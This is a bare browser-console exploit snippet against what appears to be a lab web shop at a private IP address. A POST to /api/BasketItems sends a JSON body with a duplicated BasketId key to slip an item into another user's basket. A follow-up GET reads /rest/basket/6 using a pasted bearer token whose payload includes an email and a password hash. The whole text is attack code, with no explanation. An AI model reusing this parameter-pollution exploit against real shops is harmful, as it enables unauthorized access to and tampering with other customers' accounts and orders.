fetch('http://10.25.234.204:3000/api/BasketItems', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    "Authorization": "Bearer Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoyNSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImF0dGFja2VyLXRlc3RAdGVzdC5jb20iLCJwYXNzd29yZCI6IjNmODU4Y2Y4Y2ZkNTlmMjUwMTBlNzFiNmI1NjcxNDI4Iiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjEyNy4wLjAuMSIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDI2LTA5LTI1IDE5OjAxOjIzLjY1OCArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDI2LTA5LTI1IDE5OjQ4OjMxLjY3MyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJiaWQiOjYsImlhdCI6MTc5MDM2NjQ0N30.k9cXsz5OIBskV1Gqj0OEzbo07WZekCcQjQf39eZQGm6mHySuSu0s1SRxwrELpfkNmvqXKv6YMq-wzZlj6kjuyzdy_r2NxoysxrayBUEtjQe92HXaiLLnWN9JX9cuNT0ghNfJlS61nPzP5BVG5guCrLCMNHlT4itPnfoQ-qbVFKU"
  },
  credentials: 'include',
  body: JSON.stringify({
    ProductId: 24,
    BasketId: 6,
    quantity: 1,
    BasketId: 7
  })
})
.then(async r => {
  console.log('Status:', r.status)
  console.log('Response:', await r.text())
})

// Originally called from top context.
// To resend from the same execution context, select it in the Console’s toolbar.
await fetch("http://10.25.234.204:3000/rest/basket/6", {
  "headers": {
    "accept": "application/json, text/plain, */*",
    // "accept-encoding": "gzip, deflate", // Browser negotiates compression
    "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
    "authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoyNSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImF0dGFja2VyLXRlc3RAdGVzdC5jb20iLCJwYXNzd29yZCI6IjNmODU4Y2Y4Y2ZkNTlmMjUwMTBlNzFiNmI1NjcxNDI4Iiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjEyNy4wLjAuMSIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDI2LTA5LTI1IDE5OjAxOjIzLjY1OCArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDI2LTA5LTI1IDE5OjQ4OjMxLjY3MyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJiaWQiOjYsImlhdCI6MTc5MDM2NjQ0N30.k9cXsz5OIBskV1Gqj0OEzbo07WZekCcQjQf39eZQGm6mHySuSu0s1SRxwrELpfkNmvqXKv6YMq-wzZlj6kjuyzdy_r2NxoysxrayBUEtjQe92HXaiLLnWN9JX9cuNT0ghNfJlS61nPzP5BVG5guCrLCMNHlT4itPnfoQ-qbVFKU",
    // "connection": "keep-alive", // Browser manages connections
    // "cookie": "language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoyNSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImF0dGFja2VyLXRlc3RAdGVzdC5jb20iLCJwYXNzd29yZCI6IjNmODU4Y2Y4Y2ZkNTlmMjUwMTBlNzFiNmI1NjcxNDI4Iiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjEyNy4wLjAuMSIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDI2LTA5LTI1IDE5OjAxOjIzLjY1OCArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDI2LTA5LTI1IDE5OjQ4OjMxLjY3MyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJiaWQiOjYsImlhdCI6MTc5MDM2NjQ0N30.k9cXsz5OIBskV1Gqj0OEzbo07WZekCcQjQf39eZQGm6mHySuSu0s1SRxwrELpfkNmvqXKv6YMq-wzZlj6kjuyzdy_r2NxoysxrayBUEtjQe92HXaiLLnWN9JX9cuNT0ghNfJlS61nPzP5BVG5guCrLCMNHlT4itPnfoQ-qbVFKU", // Browser manages this from the cookie jar
    // "host": "10.25.234.204:3000", // Browser will derive from URL
    "if-none-match": "W/\"20c-5MvhBGD1jCi1Oy54Ijg+4VUsWQo\"",
    // "referer": "http://10.25.234.204:3000/", // Browser will set this from referrer option + policy
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36",
    "x-user-email": "attacker-test@test.com"
  },
  "referrer": "http://10.25.234.204:3000/",
  "body": null,
  "method": "GET",
  "mode": "cors",
  "credentials": "include"
});
// Make any edits, then ENTER to resend